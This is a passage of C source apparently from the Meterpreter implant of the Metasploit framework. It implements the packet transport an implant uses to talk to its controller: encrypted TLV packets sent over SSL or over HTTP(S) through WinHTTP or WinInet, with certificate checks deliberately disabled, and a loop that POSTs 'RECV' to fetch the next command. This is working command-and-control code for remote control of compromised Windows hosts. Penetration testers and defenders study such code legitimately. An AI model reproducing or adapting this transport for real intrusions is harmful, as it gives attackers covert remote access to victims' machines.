DWORD packet_call_completion_handlers( Remote *remote, Packet *response, LPCSTR requestId )
{
	PacketCompletionRoutineEntry *current;
	DWORD result = packet_get_result( response );
	DWORD matches = 0;
	Tlv methodTlv;
	LPCSTR method = NULL;

	// Get the method associated with this packet
	if (packet_get_tlv_string(response, TLV_TYPE_METHOD, &methodTlv) == ERROR_SUCCESS)
		method = (LPCSTR)methodTlv.buffer;

	// Enumerate the completion routine list
	for (current = packetCompletionRoutineList; current; current = current->next)
	{
		// Does the request id of the completion entry match the packet's request
		// id?
		if (strcmp(requestId, current->requestId))
			continue;

		// Call the completion routine
		current->handler.routine(remote, response, current->handler.context,
				method, result);

		// Increment the number of matched handlers
		matches++;
	}

	if (matches)
		packet_remove_completion_handler(requestId);

	return (matches > 0) ? ERROR_SUCCESS : ERROR_NOT_FOUND;
}

/*!
 * @brief Remove a set of completion routine handlers for a given request identifier.
 * @param requestId ID of the request.
 * @return \c ERROR_SUCCESS is always returned.
 */
DWORD packet_remove_completion_handler( LPCSTR requestId )
{
	PacketCompletionRoutineEntry *current, *next, *prev;

	// Enumerate the list, removing entries that match
	for (current = packetCompletionRoutineList, next = NULL, prev = NULL;
	     current;
		  prev = current, current = next)
	{
		next = current->next;

		if (strcmp(requestId, current->requestId))
			continue;

		// Remove the entry from the list
		if (prev)
			prev->next = next;
		else
			packetCompletionRoutineList = next;

		// Deallocate it
		free((PCHAR)current->requestId);
		free(current);
	}

	return ERROR_SUCCESS;
}

/*!
 * @brief Transmit a packet via SSL _and_ destroy it.
 * @param remote Pointer to the \c Remote instance.
 * @param packet Pointer to the \c Packet that is to be sent.
 * @param completion Pointer to the completion routines to process.
 * @return An indication of the result of processing the transmission request.
 * @remark This uses an SSL-encrypted TCP channel, and does not imply the use of HTTPS.
 */
DWORD packet_transmit_via_ssl( Remote *remote, Packet *packet, PacketRequestCompletion *completion )
{
	CryptoContext *crypto;
	Tlv requestId;
	DWORD res;
	DWORD idx;
#ifdef _UNIX
	int local_error = -1;
#endif

	lock_acquire( remote->lock );

	// If the packet does not already have a request identifier, create one for it
	if (packet_get_tlv_string(packet, TLV_TYPE_REQUEST_ID,&requestId) != ERROR_SUCCESS)
	{
		DWORD index;
		CHAR rid[32];

		rid[sizeof(rid) - 1] = 0;

		for (index = 0; index < sizeof(rid) - 1; index++)
			rid[index] = (rand() % 0x5e) + 0x21;

		packet_add_tlv_string(packet, TLV_TYPE_REQUEST_ID, rid);
	}

	do
	{
		// If a completion routine was supplied and the packet has a request
		// identifier, insert the completion routine into the list
		if ((completion) &&
		    (packet_get_tlv_string(packet, TLV_TYPE_REQUEST_ID,
				&requestId) == ERROR_SUCCESS))
			packet_add_completion_handler((LPCSTR)requestId.buffer, completion);

		// If the endpoint has a cipher established and this is not a plaintext
		// packet, we encrypt
		if ((crypto = remote_get_cipher(remote)) &&
		    (packet_get_type(packet) != PACKET_TLV_TYPE_PLAIN_REQUEST) &&
		    (packet_get_type(packet) != PACKET_TLV_TYPE_PLAIN_RESPONSE))
		{
			ULONG origPayloadLength = packet->payloadLength;
			PUCHAR origPayload = packet->payload;

			// Encrypt
			if ((res = crypto->handlers.encrypt(crypto, packet->payload,
					packet->payloadLength, &packet->payload,
					&packet->payloadLength)) !=
					ERROR_SUCCESS)
			{
				SetLastError(res);
				break;
			}

			// Destroy the original payload as we no longer need it
			free(origPayload);

			// Update the header length
			packet->header.length = htonl(packet->payloadLength + sizeof(TlvHeader));
		}

		idx = 0;
		while( idx < sizeof(packet->header))
		{
			// Transmit the packet's header (length, type)
			res = SSL_write(
				remote->ssl,
				(LPCSTR)(&packet->header) + idx,
				sizeof(packet->header) - idx
			);

			if(res <= 0) {
				dprintf("[PACKET] transmit header failed with return %d at index %d\n", res, idx);
				break;
			}
			idx += res;
		}

		if(res < 0)
			break;

		idx = 0;
		while( idx < packet->payloadLength)
		{
			// Transmit the packet's payload (length, type)
			res = SSL_write(
				remote->ssl,
				packet->payload + idx,
				packet->payloadLength - idx
			);
			if(res < 0)
				break;

			idx += res;
		}

		if(res < 0) {
			dprintf("[PACKET] transmit header failed with return %d at index %d\n", res, idx);
			break;
		}

		SetLastError(ERROR_SUCCESS);
	} while (0);

	res = GetLastError();

	// Destroy the packet
	packet_destroy(packet);

	lock_release( remote->lock );

	return res;
}

#ifdef _WIN32
#ifdef USE_WINHTTP
/*!
 * @brief Windows-specific function to transmit a packet via HTTP(s) using winhttp _and_ destroy it.
 * @param remote Pointer to the \c Remote instance.
 * @param packet Pointer to the \c Packet that is to be sent.
 * @param completion Pointer to the completion routines to process.
 * @return An indication of the result of processing the transmission request.
 * @remark This function is not available on POSIX.
 */
DWORD packet_transmit_via_http_winhttp(Remote *remote, Packet *packet, PacketRequestCompletion *completion)
{
	DWORD res = 0;
	HINTERNET hReq;
	BOOL hRes;
	DWORD retries = 5;
	DWORD flags;
	DWORD flen;
	unsigned char *buffer;

	flen = sizeof(flags);

	buffer = malloc(packet->payloadLength + sizeof(TlvHeader));
	if (!buffer)
	{
		SetLastError(ERROR_NOT_FOUND);
		return 0;
	}

	memcpy(buffer, &packet->header, sizeof(TlvHeader));
	memcpy(buffer + sizeof(TlvHeader), packet->payload, packet->payloadLength);

	do
	{
		flags = WINHTTP_FLAG_BYPASS_PROXY_CACHE;
		if (remote->transport == METERPRETER_TRANSPORT_HTTPS)
		{
			flags |= WINHTTP_FLAG_SECURE;
			dprintf("[PACKET TRANSMIT] Setting secure flag");
		}

		hReq = WinHttpOpenRequest(remote->hConnection, L"POST", remote->uri, NULL, NULL, NULL, flags);

		if (hReq == NULL)
		{
			dprintf("[PACKET TRANSMIT] Failed WinHttpOpenRequest: %d", GetLastError());
			SetLastError(ERROR_NOT_FOUND);
			break;
		}

		dprintf("[PACKET TRANSMIT] Request created: %x", hReq);

		if (remote->transport == METERPRETER_TRANSPORT_HTTPS)
		{
			flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA
				| SECURITY_FLAG_IGNORE_CERT_DATE_INVALID
				| SECURITY_FLAG_IGNORE_CERT_CN_INVALID
				| SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;

			if (!WinHttpSetOption(hReq, WINHTTP_OPTION_SECURITY_FLAGS, &flags, sizeof(flags)))
			{
				dprintf("[PACKET TRANSMIT] failed to set security flags");
			}
		}
		dprintf("[PACKET TRANSMIT] flags set to : %x", flags);

		hRes = WinHttpSendRequest(hReq, NULL, 0, buffer, packet->payloadLength + sizeof(TlvHeader), packet->payloadLength + sizeof(TlvHeader), 0);

		if (!hRes)
		{
			dprintf("[PACKET RECEIVE] Failed HttpSendRequest: %d", GetLastError());
			SetLastError(ERROR_NOT_FOUND);
			break;
		}

		dprintf("[PACKET TRANSMIT] request sent.. apparently");
	} while(0);

	memset(buffer, 0, packet->payloadLength + sizeof(TlvHeader));
	WinHttpCloseHandle(hReq);
	return res;
}

#else

/*!
 * @brief Windows-specific function to transmit a packet via HTTP(s) _and_ destroy it.
 * @param remote Pointer to the \c Remote instance.
 * @param packet Pointer to the \c Packet that is to be sent.
 * @param completion Pointer to the completion routines to process.
 * @return An indication of the result of processing the transmission request.
 * @remark This function is not available on POSIX.
 */
DWORD packet_transmit_via_http_wininet(Remote *remote, Packet *packet, PacketRequestCompletion *completion)
{
	DWORD res = 0;
	HINTERNET hReq;
	BOOL hRes;
	DWORD retries = 5;
	DWORD flags;
	DWORD flen;
	unsigned char *buffer;

	flen = sizeof(flags);

	buffer = malloc(packet->payloadLength + sizeof(TlvHeader));
	if (!buffer)
	{
		SetLastError(ERROR_NOT_FOUND);
		return 0;
	}

	memcpy(buffer, &packet->header, sizeof(TlvHeader));
	memcpy(buffer + sizeof(TlvHeader), packet->payload, packet->payloadLength);

	do
	{

		flags = INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_NO_AUTO_REDIRECT | INTERNET_FLAG_NO_UI;
		if (remote->transport == METERPRETER_TRANSPORT_HTTPS) {
			flags |= INTERNET_FLAG_SECURE | INTERNET_FLAG_IGNORE_CERT_CN_INVALID | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID;
		}

		hReq = HttpOpenRequestW(remote->hConnection, L"POST", remote->uri, NULL, NULL, NULL, flags, 0);

		if (hReq == NULL)
		{
			dprintf("[PACKET RECEIVE] Failed HttpOpenRequest: %d", GetLastError());
			SetLastError(ERROR_NOT_FOUND);
			break;
		}

		if (remote->transport == METERPRETER_TRANSPORT_HTTPS)
		{
			InternetQueryOption(hReq, INTERNET_OPTION_SECURITY_FLAGS, &flags, &flen);
			flags |= SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_UNKNOWN_CA;
			InternetSetOption(hReq, INTERNET_OPTION_SECURITY_FLAGS, &flags, flen);
		}

		hRes = HttpSendRequest(hReq, NULL, 0, buffer, packet->payloadLength + sizeof(TlvHeader));

		if (!hRes)
		{
			dprintf("[PACKET RECEIVE] Failed HttpSendRequest: %d", GetLastError());
			SetLastError(ERROR_NOT_FOUND);
			break;
		}
	} while (0);

	memset(buffer, 0, packet->payloadLength + sizeof(TlvHeader));
	InternetCloseHandle(hReq);
	return res;
}
#endif

#endif


/*!
 * @brief Transmit a packet via HTTP(s) _and_ destroy it.
 * @param remote Pointer to the \c Remote instance.
 * @param packet Pointer to the \c Packet that is to be sent.
 * @param completion Pointer to the completion routines to process.
 * @return An indication of the result of processing the transmission request.
 */
DWORD packet_transmit_via_http(Remote *remote, Packet *packet, PacketRequestCompletion *completion)
{
	CryptoContext *crypto;
	Tlv requestId;
	DWORD res;
#ifdef _UNIX
	int local_error = -1;
#endif


	lock_acquire(remote->lock);

	// If the packet does not already have a request identifier, create one for it
	if (packet_get_tlv_string(packet, TLV_TYPE_REQUEST_ID, &requestId) != ERROR_SUCCESS)
	{
		DWORD index;
		CHAR rid[32];

		rid[sizeof(rid)-1] = 0;

		for (index = 0; index < sizeof(rid)-1; index++)
		{
			rid[index] = (rand() % 0x5e) + 0x21;
		}

		packet_add_tlv_string(packet, TLV_TYPE_REQUEST_ID, rid);
	}

	do
	{
		// If a completion routine was supplied and the packet has a request
		// identifier, insert the completion routine into the list
		if ((completion) &&
			(packet_get_tlv_string(packet, TLV_TYPE_REQUEST_ID,
			&requestId) == ERROR_SUCCESS))
			packet_add_completion_handler((LPCSTR)requestId.buffer, completion);

		// If the endpoint has a cipher established and this is not a plaintext
		// packet, we encrypt
		if ((crypto = remote_get_cipher(remote)) &&
			(packet_get_type(packet) != PACKET_TLV_TYPE_PLAIN_REQUEST) &&
			(packet_get_type(packet) != PACKET_TLV_TYPE_PLAIN_RESPONSE))
		{
			ULONG origPayloadLength = packet->payloadLength;
			PUCHAR origPayload = packet->payload;

			// Encrypt
			if ((res = crypto->handlers.encrypt(crypto, packet->payload,
				packet->payloadLength, &packet->payload,
				&packet->payloadLength)) !=
				ERROR_SUCCESS)
			{
				SetLastError(res);
				break;
			}

			// Destroy the original payload as we no longer need it
			free(origPayload);

			// Update the header length
			packet->header.length = htonl(packet->payloadLength + sizeof(TlvHeader));
		}

#ifdef _WIN32
		dprintf("Transmitting packet of length %d to remote", packet->payloadLength);
		res = packet_transmit_via_http_lib(remote, packet, completion);
#else
		// XXX: Implement non-windows HTTP delivery
#endif

		if (res < 0)
		{
			dprintf("[PACKET] transmit failed with return %d\n", res);
			break;
		}

		SetLastError(ERROR_SUCCESS);
	} while (0);

	res = GetLastError();

	// Destroy the packet
	packet_destroy(packet);

	lock_release(remote->lock);

	return res;
}

/*!
 * @brief Transmit _and_ destroy a packet.
 * @param remote Pointer to the \c Remote instance.
 * @param packet Pointer to the \c Packet that is to be sent.
 * @param completion Pointer to the completion routines to process.
 * @return An indication of the result of processing the transmission request.
 * @remark This function simply proxies to \c packet_transmit_via_ssl or \c packet_transmit_via_http
 *         depending on what the remote transport type is.
 */
DWORD packet_transmit( Remote *remote, Packet *packet, PacketRequestCompletion *completion )
{
	if (remote->transport == METERPRETER_TRANSPORT_SSL)
	{
		return packet_transmit_via_ssl(remote, packet, completion);
	}
	if (remote->transport == METERPRETER_TRANSPORT_HTTP || remote->transport == METERPRETER_TRANSPORT_HTTPS)
	{
		return packet_transmit_via_http(remote, packet, completion);
	}
	return 0;
}

/*!
 * @brief Transmit a response with just a result code to the remote endpoint.
 * @param remote Pointer to the \c Remote instance.
 * @param packet Pointer to the \c Packet that is to be sent.
 * @param res Result code to return.
 * @return An indication of the result of processing the transmission request.
 */
DWORD packet_transmit_empty_response( Remote *remote, Packet *packet, DWORD res )
{
	Packet *response = packet_create_response(packet);

	if (!response)
		return ERROR_NOT_ENOUGH_MEMORY;

	// Add the result code
	packet_add_tlv_uint(response, TLV_TYPE_RESULT, res);

	// Transmit the response
	return packet_transmit(remote, response, NULL);
}

/*!
 * @brief Receive a new packet on the given remote endpoint.
 * @param remote Pointer to the \c Remote instance.
 * @param packet Pointer to a pointer that will receive the \c Packet data.
 * @return An indication of the result of processing the transmission request.
 */
DWORD packet_receive(Remote *remote, Packet **packet)
{
	DWORD headerBytes = 0, payloadBytesLeft = 0, res;
	CryptoContext *crypto = NULL;
	Packet *localPacket = NULL;
	TlvHeader header;
	LONG bytesRead;
	BOOL inHeader = TRUE;
	PUCHAR payload = NULL;
	ULONG payloadLength;

#ifdef _UNIX
	int local_error = -1;
#endif

	if (remote->transport == METERPRETER_TRANSPORT_HTTP || remote->transport == METERPRETER_TRANSPORT_HTTPS)
	{
		return packet_receive_via_http(remote, packet);
	}

	lock_acquire(remote->lock);

	do
	{
		// Read the packet length
		while (inHeader)
		{
			if ((bytesRead = SSL_read(remote->ssl, ((PUCHAR)&header + headerBytes), sizeof(TlvHeader)-headerBytes)) <= 0)
			{
				if (!bytesRead)
				{
					SetLastError(ERROR_NOT_FOUND);
				}

				if (bytesRead < 0)
				{
					dprintf("[PACKET] receive header failed with error code %d. SSLerror=%d, WSALastError=%d\n", bytesRead, SSL_get_error(remote->ssl, bytesRead), WSAGetLastError());
					SetLastError(ERROR_NOT_FOUND);
				}

				break;
			}

			headerBytes += bytesRead;

			if (headerBytes != sizeof(TlvHeader))
			{
				continue;
			}

			inHeader = FALSE;
		}

		if (headerBytes != sizeof(TlvHeader))
		{
			break;
		}

		// Initialize the header
		header.length = header.length;
		header.type = header.type;
		payloadLength = ntohl(header.length) - sizeof(TlvHeader);
		payloadBytesLeft = payloadLength;

		// Allocate the payload
		if (!(payload = (PUCHAR)malloc(payloadLength)))
		{
			SetLastError(ERROR_NOT_ENOUGH_MEMORY);
			break;
		}

		// Read the payload
		while (payloadBytesLeft > 0)
		{
			if ((bytesRead = SSL_read(remote->ssl, payload + payloadLength - payloadBytesLeft, payloadBytesLeft)) <= 0)
			{

				if (GetLastError() == WSAEWOULDBLOCK)
				{
					continue;
				}

				if (!bytesRead)
				{
					SetLastError(ERROR_NOT_FOUND);
				}

				if (bytesRead < 0)
				{
					dprintf("[PACKET] receive payload of length %d failed with error code %d. SSLerror=%d\n", payloadLength, bytesRead, SSL_get_error(remote->ssl, bytesRead));
					SetLastError(ERROR_NOT_FOUND);
				}

				break;
			}

			payloadBytesLeft -= bytesRead;
		}

		// Didn't finish?
		if (payloadBytesLeft)
		{
			break;
		}

		// Allocate a packet structure
		if (!(localPacket = (Packet *)malloc(sizeof(Packet))))
		{
			SetLastError(ERROR_NOT_ENOUGH_MEMORY);
			break;
		}

		memset(localPacket, 0, sizeof(Packet));

		// If the connection has an established cipher and this packet is not
		// plaintext, decrypt
		if ((crypto = remote_get_cipher(remote)) &&
			(packet_get_type(localPacket) != PACKET_TLV_TYPE_PLAIN_REQUEST) &&
			(packet_get_type(localPacket) != PACKET_TLV_TYPE_PLAIN_RESPONSE))
		{
			ULONG origPayloadLength = payloadLength;
			PUCHAR origPayload = payload;

			// Decrypt
			if ((res = crypto->handlers.decrypt(crypto, payload, payloadLength, &payload, &payloadLength)) != ERROR_SUCCESS)
			{
				SetLastError(res);
				break;
			}

			// We no longer need the encrypted payload
			free(origPayload);
		}

		localPacket->header.length = header.length;
		localPacket->header.type = header.type;
		localPacket->payload = payload;
		localPacket->payloadLength = payloadLength;

		*packet = localPacket;

		SetLastError(ERROR_SUCCESS);

	} while (0);

	res = GetLastError();

	// Cleanup on failure
	if (res != ERROR_SUCCESS)
	{
		if (payload)
		{
			free(payload);
		}
		if (localPacket)
		{
			free(localPacket);
		}
	}

	lock_release(remote->lock);

	return res;
}

#ifdef _WIN32
#ifdef USE_WINHTTP

/*!
 * @brief Windows-specific function to receive a new packet via WinHTTP.
 * @param remote Pointer to the \c Remote instance.
 * @param packet Pointer to a pointer that will receive the \c Packet data.
 * @return An indication of the result of processing the transmission request.
 * @remark This function is not available in POSIX.
 */
DWORD packet_receive_http_via_winhttp(Remote *remote, Packet **packet)
{
	DWORD headerBytes = 0, payloadBytesLeft = 0, res;
	CryptoContext *crypto = NULL;
	Packet *localPacket = NULL;
	TlvHeader header;
	LONG bytesRead;
	BOOL inHeader = TRUE;
	PUCHAR payload = NULL;
	ULONG payloadLength;
	DWORD flags;

	HINTERNET hReq;
	BOOL hRes;
	DWORD retries = 5;

	lock_acquire(remote->lock);

	do
	{
		flags = WINHTTP_FLAG_BYPASS_PROXY_CACHE;
		if (remote->transport == METERPRETER_TRANSPORT_HTTPS)
		{
			flags |= WINHTTP_FLAG_SECURE;
			vdprintf("[PACKET RECEIVE WINHTTPS] Setting secure flag..");
		}

		vdprintf("[PACKET RECEIVE WINHTTPS] opening request on connection %x to %S", remote->hConnection, remote->uri);
		hReq = WinHttpOpenRequest(remote->hConnection, L"POST", remote->uri, NULL, NULL, NULL, flags);

		if (hReq == NULL)
		{
			dprintf("[PACKET RECEIVE] Failed WinHttpOpenRequest: %d", GetLastError());
			SetLastError(ERROR_NOT_FOUND);
			break;
		}

		if (remote->transport == METERPRETER_TRANSPORT_HTTPS)
		{
			vdprintf("[PACKET RECEIVE WINHTTPS] transport is SSL, setting up...");
			flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA
				| SECURITY_FLAG_IGNORE_CERT_DATE_INVALID
				| SECURITY_FLAG_IGNORE_CERT_CN_INVALID
				| SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
			if (!WinHttpSetOption(hReq, WINHTTP_OPTION_SECURITY_FLAGS, &flags, sizeof(flags)))
			{
				dprintf("[PACKET RECEIVE WINHTTPS] failed to set the security flags on the request");
			}
		}

		vdprintf("[PACKET RECEIVE WINHTTPS] sending the 'RECV' command...");
		// TODO: when the MSF side supports it, update this so that it's UTF8
		char pRecv[] = "RECV";
		hRes = WinHttpSendRequest(hReq, WINHTTP_NO_ADDITIONAL_HEADERS, 0, pRecv, sizeof(pRecv), sizeof(pRecv), 0);

		if (!hRes)
		{
			dprintf("[PACKET RECEIVE] Failed WinHttpSendRequest: %d", GetLastError());
			SetLastError(ERROR_NOT_FOUND);
			break;
		}

		// TODO: validate the server certificate

		vdprintf("[PACKET RECEIVE WINHTTPS] Waiting to see the response ...");
		if (!WinHttpReceiveResponse(hReq, NULL))
		{
			vdprintf("[PACKET RECEIVE] Failed WinHttpReceiveResponse: %d", GetLastError());
			SetLastError(ERROR_NOT_FOUND);
			break;
		}

		if (remote->pCertHash != NULL)
		{
			vdprintf("[PACKET RECEIVE WINHTTPS] validating certificate hash");
			PCERT_CONTEXT pCertContext = NULL;
			DWORD dwCertContextSize = sizeof(pCertContext);

			if (!WinHttpQueryOption(hReq, WINHTTP_OPTION_SERVER_CERT_CONTEXT, &pCertContext, &dwCertContextSize))
			{
				vdprintf("[PACKET RECEIVE WINHTTPS] Failed to get the certificate context: %u", GetLastError());
				SetLastError(ERROR_NOT_FOUND);
				break;
			}

			DWORD dwHashSize = 20;
			BYTE hash[20];
			if (!CertGetCertificateContextProperty(pCertContext, CERT_SHA1_HASH_PROP_ID, hash, &dwHashSize))
			{
				vdprintf("[PACKET RECEIVE WINHTTPS] Failed to get the certificate hash: %u", GetLastError());
				SetLastError(ERROR_NOT_FOUND);
				break;
			}

			vdprintf("[SERVER] Server hash set to: %02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x",
				hash[0], hash[1], hash[2], hash[3], hash[4], hash[5], hash[6], hash[7], hash[8], hash[9], hash[10],
				hash[11], hash[12], hash[13], hash[14], hash[15], hash[16], hash[17], hash[18], hash[19]);

			if (memcmp(hash, remote->pCertHash, 20) != 0)
			{
				vdprintf("[PACKET RECEIVE WINHTTPS] Certificate hash doesn't match, bailing out");
				SetLastError(ERROR_NOT_FOUND);
				break;
			}
		}

#ifdef DEBUGTRACE
		DWORD dwSize = 0;
		if (!WinHttpQueryDataAvailable(hReq, &dwSize))
		{
			vdprintf("[PACKET RECEIVE WINHTTPS] WinHttpQueryDataAvailable failed: %x", GetLastError());
		}
		else
		{
			vdprintf("[PACKET RECEIVE WINHTTPS] Available data: %u bytes", dwSize);
		}
#endif

		// Read the packet length
		retries = 3;
		vdprintf("[PACKET RECEIVE WINHTTPS] Start looping through the receive calls");
		while (inHeader && retries > 0)
		{
			retries--;
			if (!WinHttpReadData(hReq, (PUCHAR)&header + headerBytes, sizeof(TlvHeader)-headerBytes, &bytesRead))
			{
				dprintf("[PACKET RECEIVE] Failed HEADER WinhttpReadData: %d", GetLastError());
				SetLastError(ERROR_NOT_FOUND);
				break;
			}

			vdprintf("[PACKET RECEIVE WINHTTPS] Data received: %u bytes", bytesRead);

			// If the response contains no data, this is fine, it just means the
			// remote side had nothing to tell us. Indicate this through a
			// ERROR_EMPTY response code so we can update the timestamp.
			if (bytesRead == 0)
			{
				SetLastError(ERROR_EMPTY);
				break;
			}

			headerBytes += bytesRead;

			if (headerBytes != sizeof(TlvHeader))
			{
				continue;
			}

			inHeader = FALSE;
		}

		if (GetLastError() == ERROR_EMPTY)
		{
			break;
		}

		if (headerBytes != sizeof(TlvHeader))
		{
			dprintf("[PACKET RECEIVE WINHTTPS] headerBytes no valid");
			SetLastError(ERROR_NOT_FOUND);
			break;
		}

		// Initialize the header
		vdprintf("[PACKET RECEIVE WINHTTPS] initialising header");
		header.length = header.length;
		header.type = header.type;
		payloadLength = ntohl(header.length) - sizeof(TlvHeader);
		payloadBytesLeft = payloadLength;

		// Allocate the payload
		if (!(payload = (PUCHAR)malloc(payloadLength)))
		{
			SetLastError(ERROR_NOT_ENOUGH_MEMORY);
			break;
		}

		// Read the payload
		retries = payloadBytesLeft;
		while (payloadBytesLeft > 0 && retries > 0)
		{
			vdprintf("[PACKET RECEIVE WINHTTPS] reading more data from the body...");
			retries--;
			if (!WinHttpReadData(hReq, payload + payloadLength - payloadBytesLeft, payloadBytesLeft, &bytesRead))
			{
				dprintf("[PACKET RECEIVE] Failed BODY WinHttpReadData: %d", GetLastError());
				SetLastError(ERROR_NOT_FOUND);
				break;
			}

			if (!bytesRead)
			{
				vdprintf("[PACKET RECEIVE WINHTTPS] no bytes read, bailing out");
				SetLastError(ERROR_NOT_FOUND);
				break;
			}

			vdprintf("[PACKET RECEIVE WINHTTPS] bytes read: %u", bytesRead);
			payloadBytesLeft -= bytesRead;
		}

		// Didn't finish?
		if (payloadBytesLeft)
		{
			break;
		}

		// Allocate a packet structure
		if (!(localPacket = (Packet *)malloc(sizeof(Packet))))
		{
			SetLastError(ERROR_NOT_ENOUGH_MEMORY);
			break;
		}

		memset(localPacket, 0, sizeof(Packet));

		// If the connection has an established cipher and this packet is not
		// plaintext, decrypt
		if ((crypto = remote_get_cipher(remote)) &&
			(packet_get_type(localPacket) != PACKET_TLV_TYPE_PLAIN_REQUEST) &&
			(packet_get_type(localPacket) != PACKET_TLV_TYPE_PLAIN_RESPONSE))
		{
			ULONG origPayloadLength = payloadLength;
			PUCHAR origPayload = payload;

			// Decrypt
			if ((res = crypto->handlers.decrypt(crypto, payload, payloadLength, &payload, &payloadLength)) != ERROR_SUCCESS)
			{
				SetLastError(res);
				break;
			}

			// We no longer need the encrypted payload
			free(origPayload);
		}

		localPacket->header.length = header.length;
		localPacket->header.type = header.type;
		localPacket->payload = payload;
		localPacket->payloadLength = payloadLength;

		*packet = localPacket;

		SetLastError(ERROR_SUCCESS);

	} while (0);

	res = GetLastError();

	// Cleanup on failure
	if (res != ERROR_SUCCESS)
	{
		if (payload)
		{
			free(payload);
		}
		if (localPacket)
		{
			free(localPacket);
		}
	}

	if (hReq)
	{
		WinHttpCloseHandle(hReq);
	}

	lock_release(remote->lock);

	return res;
}

#else

/*!
 * @brief Windows-specific function to receive a new packet via WinInet.
 * @param remote Pointer to the \c Remote instance.
 * @param packet Pointer to a pointer that will receive the \c Packet data.
 * @return An indication of the result of processing the transmission request.
 * @remark This function is not available in POSIX.
 */
DWORD packet_receive_http_via_wininet( Remote *remote, Packet **packet )
{

	DWORD headerBytes = 0, payloadBytesLeft = 0, res;
	CryptoContext *crypto = NULL;
	Packet *localPacket = NULL;
	TlvHeader header;
	LONG bytesRead;
	BOOL inHeader = TRUE;
	PUCHAR payload = NULL;
	ULONG payloadLength;
	DWORD flags;
	DWORD flen;

	HINTERNET hReq;
	BOOL hRes;
	DWORD retries = 5;

	lock_acquire( remote->lock );

	do
	{

		flags = INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_NO_AUTO_REDIRECT | INTERNET_FLAG_NO_UI;
		if (remote->transport == METERPRETER_TRANSPORT_HTTPS) {
			flags |= INTERNET_FLAG_SECURE | INTERNET_FLAG_IGNORE_CERT_CN_INVALID | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID;
		}

		dprintf("[PACKET RECEIVE] HttpOpenRequest");
		hReq = HttpOpenRequestW(remote->hConnection, L"POST", remote->uri, NULL, NULL, NULL, flags, 0 );

		if (hReq == NULL) {
			dprintf("[PACKET RECEIVE] Failed HttpOpenRequest: %d", GetLastError());
			SetLastError(ERROR_NOT_FOUND);
			break;
		}

		if (remote->transport == METERPRETER_TRANSPORT_HTTPS) {
			InternetQueryOption( hReq, INTERNET_OPTION_SECURITY_FLAGS, &flags, &flen);
			flags |= SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_UNKNOWN_CA;
			InternetSetOptionW(hReq, INTERNET_OPTION_SECURITY_FLAGS, &flags, flen);
		}

		hRes = HttpSendRequest(hReq, NULL, 0, "RECV", 4 );
		if (! hRes) {
			dprintf("[PACKET RECEIVE] Failed HttpSendRequest: %d", GetLastError());
			SetLastError(ERROR_NOT_FOUND);
			break;
		}

		// Read the packet length
		retries = 3;
		while (inHeader && retries > 0)
		{
			retries--;
			if (! InternetReadFile(hReq, ((PUCHAR)&header + headerBytes), sizeof(TlvHeader) - headerBytes, &bytesRead))  {
				dprintf("[PACKET RECEIVE] Failed HEADER InternetReadFile: %d", GetLastError());
				SetLastError(ERROR_NOT_FOUND);
				break;
			}

			// If the response contains no data, this is fine, it just means the
			// remote side had nothing to tell us. Indicate this through a
			// ERROR_EMPTY response code so we can update the timestamp.
			if (bytesRead == 0) {
				SetLastError(ERROR_EMPTY);
				break;
			}

			headerBytes += bytesRead;

			if (headerBytes != sizeof(TlvHeader)) {
				continue;
			} else {
				inHeader = FALSE;
			}
		}

		if (GetLastError() == ERROR_EMPTY)
			break;

		if (headerBytes != sizeof(TlvHeader)) {
			SetLastError(ERROR_NOT_FOUND);
			break;
		}

		// Initialize the header
		header.length    = header.length;
		header.type      = header.type;
		payloadLength    = ntohl(header.length) - sizeof(TlvHeader);
		payloadBytesLeft = payloadLength;

		// Allocate the payload
		if (!(payload = (PUCHAR)malloc(payloadLength)))
		{
			SetLastError(ERROR_NOT_ENOUGH_MEMORY);
			break;
		}

		// Read the payload
		retries = payloadBytesLeft;
		while (payloadBytesLeft > 0 && retries > 0 )
		{
			retries--;
			if (! InternetReadFile(hReq, payload + payloadLength - payloadBytesLeft, payloadBytesLeft, &bytesRead))  {
				dprintf("[PACKET RECEIVE] Failed BODY InternetReadFile: %d", GetLastError());
				SetLastError(ERROR_NOT_FOUND);
				break;
			}

			if (!bytesRead) {
				SetLastError(ERROR_NOT_FOUND);
				break;
			}

			payloadBytesLeft -= bytesRead;
		}

		// Didn't finish?
		if (payloadBytesLeft)
			break;

		// Allocate a packet structure
		if (!(localPacket = (Packet *)malloc(sizeof(Packet))))
		{
			SetLastError(ERROR_NOT_ENOUGH_MEMORY);
			break;
		}

		memset( localPacket, 0, sizeof(Packet) );

		// If the connection has an established cipher and this packet is not
		// plaintext, decrypt
		if ((crypto = remote_get_cipher(remote)) &&
		    (packet_get_type(localPacket) != PACKET_TLV_TYPE_PLAIN_REQUEST) &&
		    (packet_get_type(localPacket) != PACKET_TLV_TYPE_PLAIN_RESPONSE))
		{
			ULONG origPayloadLength = payloadLength;
			PUCHAR origPayload = payload;

			// Decrypt
			if ((res = crypto->handlers.decrypt(crypto, payload, payloadLength,&payload, &payloadLength)) != ERROR_SUCCESS)
			{
				SetLastError(res);
				break;
			}

			// We no longer need the encrypted payload
			free(origPayload);
		}

		localPacket->header.length = header.length;
		localPacket->header.type   = header.type;
		localPacket->payload       = payload;
		localPacket->payloadLength = payloadLength;

		*packet = localPacket;

		SetLastError(ERROR_SUCCESS);

	} while (0);

	res = GetLastError();

	// Cleanup on failure
	if (res != ERROR_SUCCESS)
	{
		if (payload)
			free(payload);
		if (localPacket)
			free(localPacket);
	}

	if (hReq)
		InternetCloseHandle(hReq);

	lock_release( remote->lock );

	return res;
}
#endif

#endif



/*!
 * @brief Windows-specific function to receive a new packet via WinInet.
 * @param remote Pointer to the \c Remote instance.
 * @param packet Pointer to a pointer that will receive the \c Packet data.
